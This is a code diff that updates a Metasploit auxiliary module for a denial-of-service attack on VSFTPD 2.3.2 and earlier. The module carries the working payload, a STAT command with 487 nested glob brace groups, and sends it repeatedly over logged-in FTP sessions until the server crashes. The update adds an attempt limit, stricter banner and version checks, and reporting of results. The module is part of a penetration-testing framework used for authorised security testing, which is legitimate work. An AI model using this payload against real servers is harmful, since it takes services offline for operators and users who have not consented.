@@ -6,21 +6,24 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Ftp
   include Msf::Auxiliary::Dos
+  prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name'	=> 'VSFTPD 2.3.2 Denial of Service',
-        'Description'	=> %q{
+        'Name' => 'VSFTPD 2.3.2 and Earlier STAT Denial of Service',
+        'Description' => %q{
           This module triggers a Denial of Service condition in the VSFTPD server in
-          versions before 2.3.3. So far, it has been tested on 2.3.0, 2.3.1, and 2.3.2.
+          versions before 2.3.3 (tested on 2.3.0, 2.3.1, and 2.3.2).
+          Version 2.3.3 and higher should not be vulnerable.
         },
         'Author' => [
           'Nick Cottrell (Rad10Logic) <ncottrellweb[at]gmail.com>', # Module Creator
           'Anna Graterol <annagraterol95[at]gmail.com>', # Vuln researcher
           'Mana Mostaani <mana.mostaani[at]gmail.com>',
-          'Maksymilian Arciemowicz' # Original EDB PoC
+          'Maksymilian Arciemowicz', # Original EDB PoC
+          'g0tmi1k' # @g0tmi1k - additional features
         ],
         'License' => MSF_LICENSE,
         'References' => [
@@ -36,74 +39,122 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
     )
+
+    register_options([
+      OptInt.new('MAX_ATTEMPTS', [false, 'Maximum payload attempts before giving up (0 = unlimited)', 25])
+    ])
   end
 
   def check
     # attempt to connect
     begin
-      if !connect_login
-        print_error('Connection refused.')
-        return Exploit::CheckCode::Unknown
-      end
+      connect
     rescue Rex::ConnectionRefused
-      print_error('Connection refused.')
-      return Exploit::CheckCode::Unknown
+      return Exploit::CheckCode::Unknown('Connection refused by the target')
     rescue Rex::ConnectionTimeout
-      print_error('Connection timed out')
-      return Exploit::CheckCode::Unknown
+      return Exploit::CheckCode::Unknown('Connection timed out')
     end
+
+    return Exploit::CheckCode::Safe("Does not appear to be VSFTPD (banner: #{banner_version})") unless banner&.downcase&.include?('vsftpd')
+
+    vprint_status("FTP banner: #{banner_version}") if banner
+
+    res = send_user(user)
+    return Exploit::CheckCode::Unknown("Failed to connect or authenticate via FTP: #{res}") unless res =~ /^(331|2)/
+
+    res = send_pass(pass)
+    return Exploit::CheckCode::Unknown("Failed to connect or authenticate via FTP: #{res}") unless res =~ /^2/
+
     s = ''
+    stat_output = ''
+    attempts = 0
+    max = datastore['MAX_ATTEMPTS']
     loop do
+      attempts += 1
+
       # get each line until our desired line shows or end line shows
       s = send_cmd(['STAT'], true)
+      return Exploit::CheckCode::Unknown('No response received for STAT') unless s
+
+      stat_output << s
       break if (s =~ /vsFTPd \d+\.\d+\.\d+/) || (s == "211 End of status\r\n")
+
+      if max > 0 && attempts >= max
+        print_error("Reached #{max} attempts")
+        break
+      end
     end
-    disconnect
+
+    stat_output.strip.each_line.with_index do |line, i|
+      prefix = i == 0 ? 'STAT: ' : '  '
+      vprint_status("#{prefix}#{line.strip}")
+    end
+
+    report_note(
+      host: rhost,
+      port: rport,
+      proto: 'tcp',
+      sname: 'ftp',
+      type: 'ftp.cmd.stat',
+      data: { username: user, output: stat_output.strip }
+    )
+
     # check if version was found
     if s !~ /vsFTPd \d+\.\d+\.\d+/
-      print_error('Did not find FTP version in FTP session.')
-      return Exploit::CheckCode::Unknown
+      print_error('Did not find FTP version in FTP session')
+      return Exploit::CheckCode::Unknown('Could not determine VSFTPD version')
     end
 
     # pull out version and check if its in range of vulnerability
-    version = s[/\d+\.\d+\.\d+/]
+    version = s[/vsFTPd (\d+\.\d+\.\d+)/, 1]
     if Rex::Version.new(version) < Rex::Version.new('2.3.3')
-      Exploit::CheckCode::Appears
+      Exploit::CheckCode::Appears("VSFTPD #{version} is vulnerable (affected: <= 2.3.2)")
     else
-      Exploit::CheckCode::Safe
+      Exploit::CheckCode::Safe("VSFTPD #{version} is not vulnerable (affected: <= 2.3.2)")
     end
+  ensure
+    disconnect
   end
 
   def run
-    fail_with(Failure::NotVulnerable, 'Target is not vulnerable.') if check != Exploit::CheckCode::Appears
-
     payload = 'STAT ' + '{{*},' * 487 + '{.}' + '}' * 487
+    vprint_status("FTP DoS command: #{payload}")
 
-    vprint_status("Payload being sent: #{payload}")
-    print_status('sending payload')
-
+    attempts = 0
+    max = datastore['MAX_ATTEMPTS']
     loop do
-      print('.')
-      connect_login
+      attempts += 1
+      if max > 0 && attempts >= max
+        print_error("Reached #{max} attempts without DoS")
+        break
+      end
+      print_status("Attempt: #{attempts}/#{max} - Sending DoS command")
+
+      unless connect_login
+        print_error('Authentication failed - check FTPUSER/FTPPASS credentials')
+        break
+      end
+
       10.times do
         send_cmd([payload.to_s], false)
       end
       send_cmd([payload.to_s], true)
+
+      # Otherwise report_service has a bad time
       disconnect
+      @ftpbuff = ''
     rescue Rex::ConnectionTimeout
-      print("\n")
       print_error('Connection timeout! Sending again')
     rescue Errno::ECONNRESET
-      print("\n")
       print_error('Connection reset!')
     rescue Rex::ConnectionRefused
-      print("\n")
-      print_good('Connection refused! Appears DOS attack succeeded.')
+      print_good('Connection refused! Appears DoS attack succeeded')
+      break
     rescue EOFError
-      print("\n")
-      print_good('Stream was cut off abruptly. Appears DOS attack succeeded.')
+      print_good('Stream was cut off abruptly. Appears DoS attack succeeded')
       break
     end
+  ensure
     disconnect
   end
 end
